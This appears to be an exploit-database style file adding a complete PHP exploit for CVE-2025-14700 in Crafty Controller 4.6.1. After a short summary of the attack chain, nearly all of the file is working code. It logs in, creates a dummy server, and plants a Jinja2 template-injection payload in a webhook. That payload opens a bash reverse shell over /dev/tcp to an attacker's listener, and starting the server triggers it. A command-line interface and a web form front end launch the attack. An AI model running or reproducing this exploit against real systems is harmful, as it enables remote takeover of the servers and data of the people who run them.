@@ -1,0 +1,454 @@
+=============================================================================================================================================
+| # Title     : Crafty Controller 4.6.1 authenticated RCE via Server-Side Template Injection                                                |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://craftycontrol.com/                                                                                                  |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/213042/ & 	CVE-2025-14700
+
+[+] Summary    : This PHP script is a complete port of a Python exploit targeting CVE-2025-14700, a critical vulnerability in the Crafty Controller Minecraft server management platform. 
+                 The exploit chain allows authenticated remote attackers to execute arbitrary system commands on the target server through Server-Side Template Injection (SSTI) in the webhook configuration feature.
+
+[+] Exploitation Chain:
+
+1- Authentication Bypass & Token Harvesting
+
+Retrieves initial XSRF token from login page
+
+Authenticates with admin credentials to obtain JWT token
+
+Maintains session cookies throughout the attack
+
+2- Server Creation for Payload Delivery
+
+Creates a dummy Minecraft server via API
+
+Required to access the vulnerable webhook configuration endpoint
+
+3- SSTI Payload Injection
+
+Injects malicious Jinja2 template into Discord webhook configuration
+
+Uses cycler.__init__.__globals__.os.system() to escape template sandbox
+
+Embeds reverse shell command for remote access
+
+4- Triggering the Vulnerability
+
+Emulates browser requests to trigger server start action
+
+Executes EULA confirmation to initialize the server
+
+The template is rendered during server initialization, executing the payload
+
+[+] Technical Details:
+
+Vulnerable Component: Webhook configuration in /api/v2/servers/{id}/webhook
+
+Attack Vector: Authenticated SSTI → RCE
+
+Privileges Required: Admin credentials
+
+Impact: Full system compromise via reverse shell
+
+Default Port: 8443 (HTTPS)
+
+
+[+]  CODE : php exploit.php --url=https://target.com:8443 --login=admin --password=password --lhost=192.168.1.100 --lport=4444
+
+<?php
+
+
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// Reverse Shell Template
+define('REVSHELL_TEMPLATE', "bash -c 'bash -i >/dev/tcp/%s/%d 0<&1 2>&1'");
+
+class CraftyExploit {
+    private $url;
+    private $login;
+    private $password;
+    private $lhost;
+    private $lport;
+    private $session;
+    private $cookies;
+    
+    public function __construct($url, $login, $password, $lhost, $lport) {
+        $this->url = rtrim($url, '/');
+        $this->login = $login;
+        $this->password = $password;
+        $this->lhost = $lhost;
+        $this->lport = $lport;
+        $this->session = curl_init();
+        $this->cookies = [];
+        
+        // Configure cURL options
+        curl_setopt($this->session, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($this->session, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($this->session, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($this->session, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($this->session, CURLOPT_HEADER, true);
+        curl_setopt($this->session, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+    }
+    
+    private function request($method, $endpoint, $data = null, $headers = [], $returnHeaders = false) {
+        $url = $this->url . $endpoint;
+        
+        curl_setopt($this->session, CURLOPT_URL, $url);
+        curl_setopt($this->session, CURLOPT_CUSTOMREQUEST, $method);
+        
+        // Set headers
+        $defaultHeaders = [
+            'Accept: application/json, text/plain, */*',
+            'Accept-Language: en-US,en;q=0.9',
+            'Connection: keep-alive',
+        ];
+        
+        $allHeaders = array_merge($defaultHeaders, $headers);
+        curl_setopt($this->session, CURLOPT_HTTPHEADER, $allHeaders);
+        
+        // Set cookies if any
+        if (!empty($this->cookies)) {
+            $cookieStr = '';
+            foreach ($this->cookies as $name => $value) {
+                $cookieStr .= "$name=$value; ";
+            }
+            curl_setopt($this->session, CURLOPT_COOKIE, trim($cookieStr));
+        }
+        
+        // Set POST data
+        if ($method === 'POST' && $data !== null) {
+            if (isset($headers['Content-Type']) && strpos($headers['Content-Type'], 'application/json') !== false) {
+                curl_setopt($this->session, CURLOPT_POSTFIELDS, json_encode($data));
+            } else {
+                curl_setopt($this->session, CURLOPT_POSTFIELDS, $data);
+            }
+        }
+        
+        $response = curl_exec($this->session);
+        
+        if ($response === false) {
+            echo "cURL Error: " . curl_error($this->session) . "\n";
+            return false;
+        }
+        
+        // Parse response
+        $headerSize = curl_getinfo($this->session, CURLINFO_HEADER_SIZE);
+        $headers = substr($response, 0, $headerSize);
+        $body = substr($response, $headerSize);
+        
+        // Update cookies from response
+        $this->parseCookies($headers);
+        
+        // Create response object
+        $result = [
+            'status_code' => curl_getinfo($this->session, CURLINFO_HTTP_CODE),
+            'headers' => $headers,
+            'body' => $body,
+            'request_url' => $url,
+            'request_method' => $method
+        ];
+        
+        if ($returnHeaders) {
+            return $result;
+        }
+        
+        return $body;
+    }
+    
+    private function parseCookies($headers) {
+        $lines = explode("\n", $headers);
+        foreach ($lines as $line) {
+            if (stripos($line, 'Set-Cookie:') === 0) {
+                $cookie = trim(substr($line, 11));
+                $parts = explode(';', $cookie);
+                $cookiePair = explode('=', $parts[0], 2);
+                if (count($cookiePair) === 2) {
+                    $this->cookies[$cookiePair[0]] = $cookiePair[1];
+                }
+            }
+        }
+    }
+    
+    private function printDebugInfo($response) {
+        echo "\n" . str_repeat("=", 80) . "\n";
+        echo "[{$response['request_method']}] {$response['request_url']} -> HTTP {$response['status_code']}\n";
+        echo str_repeat("-", 20) . " [KEY HEADERS VALIDATION] " . str_repeat("-", 20) . "\n";
+        
+        // Important headers to display
+        $importantHeaders = ['token', 'X-XSRFToken', 'Authorization', 'Cookie', 'Referer', 'Content-Type'];
+        $headers = $this->parseResponseHeaders($response['headers']);
+        
+        foreach ($importantHeaders as $h) {
+            $hLower = strtolower($h);
+            foreach ($headers as $headerName => $headerValue) {
+                if (strtolower($headerName) === $hLower) {
+                    echo "$h: $headerValue\n";
+                    break;
+                }
+            }
+        }
+        
+        echo str_repeat("-", 20) . " [RESPONSE BODY] " . str_repeat("-", 25) . "\n";
+        
+        // Try to decode JSON
+        $json = json_decode($response['body'], true);
+        if (json_last_error() === JSON_ERROR_NONE) {
+            echo json_encode($json, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
+        } else {
+            // Truncate output if it's not JSON
+            echo (strlen($response['body']) > 200) ? substr($response['body'], 0, 200) . "..." : $response['body'];
+            if (empty($response['body'])) {
+                echo "(Empty Body)";
+            }
+            echo "\n";
+        }
+        
+        echo str_repeat("=", 80) . "\n\n";
+    }
+    
+    private function parseResponseHeaders($headers) {
+        $parsed = [];
+        $lines = explode("\n", $headers);
+        foreach ($lines as $line) {
+            if (strpos($line, ':') !== false) {
+                list($name, $value) = explode(':', $line, 2);
+                $parsed[trim($name)] = trim($value);
+            }
+        }
+        return $parsed;
+    }
+    
+    public function apiLogin() {
+        echo "[*] STEP 1: Visiting login page to retrieve initial _xsrf cookie...\n";
+        
+        // Get initial XSRF token
+        $response = $this->request('GET', '/login', null, [], true);
+        $xsrf = $this->cookies['_xsrf'] ?? '';
+        
+        echo "[*] STEP 2: Executing authentication (XSRF: " . substr($xsrf, 0, 15) . "...)\n";
+        
+        $endpoint = '/api/v2/auth/login/';
+        $headers = [
+            'Content-Type: application/json',
+            'X-XSRFToken: ' . $xsrf,
+            'Referer: ' . $this->url . '/login?next=%2Fpanel%2Fdashboard',
+            'Origin: ' . $this->url
+        ];
+        
+        $data = [
+            'username' => $this->login,
+            'password' => $this->password
+        ];
+        
+        $response = $this->request('POST', $endpoint, $data, $headers, true);
+        $this->printDebugInfo($response);
+        
+        $responseData = json_decode($response['body'], true);
+        
+        if ($response['status_code'] == 200 && 
+            isset($responseData['status']) && 
+            $responseData['status'] == 'ok' &&
+            isset($responseData['data']['token'])) {
+            return $responseData['data']['token'];
+        }
+        
+        die("[FATAL] Login failed. Please check credentials or target connectivity.\n");
+    }
+    
+    public function createServer($jwtToken) {
+        echo "[*] STEP 3: Creating exploit dummy server...\n";
+        
+        $endpoint = '/api/v2/servers';
+        $xsrf = $this->cookies['_xsrf'] ?? '';
+        
+        $headers = [
+            'Content-Type: application/json',
+            'Authorization: Bearer ' . $jwtToken,
+            'X-XSRFToken: ' . $xsrf,
+            'Referer: ' . $this->url . '/panel/dashboard'
+        ];
+        
+        $data = [
+            'name' => 'CVE_2025_14700_Exploit_Automation',
+            'monitoring_type' => 'minecraft_java',
+            'minecraft_java_monitoring_data' => ['host' => '127.0.0.1', 'port' => 25565],
+            'create_type' => 'minecraft_java',
+            'minecraft_java_create_data' => [
+                'create_type' => 'download_jar',
+                'download_jar_create_data' => [
+                    'category' => 'mc_java_servers',
+                    'type' => 'paper',
+                    'version' => '1.18.2',
+                    'mem_min' => 1,
+                    'mem_max' => 2,
+                    'server_properties_port' => 25565
+                ]
+            ]
+        ];
+        
+        $response = $this->request('POST', $endpoint, $data, $headers, true);
+        $this->printDebugInfo($response);
+        
+        $responseData = json_decode($response['body'], true);
+        
+        if (isset($responseData['data']['new_server_id'])) {
+            return $responseData['data']['new_server_id'];
+        }
+        
+        die("[FATAL] Failed to create server.\n");
+    }
+    
+    public function createHook($serverId, $lhost, $lport, $jwtToken) {
+        echo "[*] STEP 4: Injecting SSTI Reverse Shell payload...\n";
+        
+        $endpoint = "/api/v2/servers/{$serverId}/webhook";
+        $xsrf = $this->cookies['_xsrf'] ?? '';
+        $revshellCmd = sprintf(REVSHELL_TEMPLATE, $lhost, $lport);
+        
+        // Jinja2 SSTI payload
+        $payload = '{{ self._TemplateReference__context.cycler.__init__.__globals__.os.system("' . $revshellCmd . '") }}';
+        
+        $headers = [
+            'Content-Type: application/json',
+            'Authorization: Bearer ' . $jwtToken,
+            'X-XSRFToken: ' . $xsrf,
+            'Referer: ' . $this->url . '/panel/dashboard'
+        ];
+        
+        $data = [
+            'webhook_type' => 'Discord',
+            'name' => 'Exploit_Trigger_Hook',
+            'url' => 'https://localhost:8443/',
+            'bot_name' => 'Crafty Bot',
+            'trigger' => ['start_server'],
+            'body' => $payload,
+            'color' => '#c646000',
+            'enabled' => true
+        ];
+        
+        $response = $this->request('POST', $endpoint, $data, $headers, true);
+        $this->printDebugInfo($response);
+    }
+    
+    public function triggerExploit($serverId, $jwtToken) {
+        echo "\n[*] STEP 5: Executing protocol-level trigger emulation (Critical Phase)...\n";
+        
+        $xsrf = $this->cookies['_xsrf'] ?? '';
+        $host = parse_url($this->url, PHP_URL_HOST);
+        
+        // Set JWT in cookies
+        $this->cookies['token'] = $jwtToken;
+        
+        // 1. Trigger Start Server Action
+        $startUrl = "/api/v2/servers/{$serverId}/action/start_server";
+        echo "[*] Sending start_server action request...\n";
+        
+        $headers = [
+            'token: ' . $xsrf,
+            'X-XSRFToken: ' . $xsrf,
+            'X-Requested-With: XMLHttpRequest',
+            'Origin: ' . $this->url,
+            'Referer: ' . $this->url . '/panel/dashboard',
+            'Accept: */*',
+            'Accept-Encoding: gzip, deflate, br',
+            'sec-ch-ua-platform: "Windows"'
+        ];
+        
+        $response = $this->request('POST', $startUrl, '', $headers, true);
+        $this->printDebugInfo($response);
+        
+        sleep(2);
+        
+        // 2. Trigger EULA Action
+        $eulaUrl = "/api/v2/servers/{$serverId}/action/eula";
+        echo "[*] Sending EULA confirmation action request...\n";
+        
+        $this->request('POST', $eulaUrl, '', $headers, false);
+        
+        echo "\n[+] POC Execution completed. Check your nc listener ({$this->lhost}:{$this->lport}).\n";
+    }
+    
+    public function run() {
+        $jwt = $this->apiLogin();
+        $serverId = $this->createServer($jwt);
+        $this->createHook($serverId, $this->lhost, $this->lport, $jwt);
+        $this->triggerExploit($serverId, $jwt);
+    }
+    
+    public function __destruct() {
+        if (is_resource($this->session)) {
+            curl_close($this->session);
+        }
+    }
+}
+
+// Command line interface
+if (PHP_SAPI === 'cli') {
+    $options = getopt('u:l:p:lh:lp:', [
+        'url:', 'login:', 'password:', 'lhost:', 'lport:'
+    ]);
+    
+    $url = $options['u'] ?? $options['url'] ?? null;
+    $login = $options['l'] ?? $options['login'] ?? null;
+    $password = $options['p'] ?? $options['password'] ?? null;
+    $lhost = $options['lh'] ?? $options['lhost'] ?? null;
+    $lport = $options['lp'] ?? $options['lport'] ?? null;
+    
+    if (!$url || !$login || !$password || !$lhost || !$lport) {
+        echo "Usage: php " . basename(__FILE__) . " [options]\n";
+        echo "Options:\n";
+        echo "  -u, --url        Target base URL (e.g., https://10.67.3.77:8443)\n";
+        echo "  -l, --login      Admin username\n";
+        echo "  -p, --password   Admin password\n";
+        echo "  -lh, --lhost     Local listener IP\n";
+        echo "  -lp, --lport     Local listener port\n";
+        exit(1);
+    }
+    
+    $exploit = new CraftyExploit($url, $login, $password, $lhost, (int)$lport);
+    $exploit->run();
+} else {
+    // Web interface (optional)
+    echo "<pre>";
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        $url = $_POST['url'] ?? '';
+        $login = $_POST['login'] ?? '';
+        $password = $_POST['password'] ?? '';
+        $lhost = $_POST['lhost'] ?? '';
+        $lport = $_POST['lport'] ?? '';
+        
+        if ($url && $login && $password && $lhost && $lport) {
+            $exploit = new CraftyExploit($url, $login, $password, $lhost, (int)$lport);
+            $exploit->run();
+        } else {
+            echo "Please fill all fields.\n";
+        }
+    }
+    echo "</pre>";
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>CVE-2025-14700 Exploit</title>
+    </head>
+    <body>
+        <h2>CVE-2025-14700 Exploit Interface</h2>
+        <form method="POST">
+            URL: <input type="text" name="url" size="50" placeholder="https://10.67.3.77:8443"><br><br>
+            Login: <input type="text" name="login"><br><br>
+            Password: <input type="password" name="password"><br><br>
+            LHOST: <input type="text" name="lhost" placeholder="192.168.1.100"><br><br>
+            LPORT: <input type="text" name="lport" placeholder="4444"><br><br>
+            <input type="submit" value="Execute">
+        </form>
+    </body>
+    </html>
+    <?php
+}
+?>
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
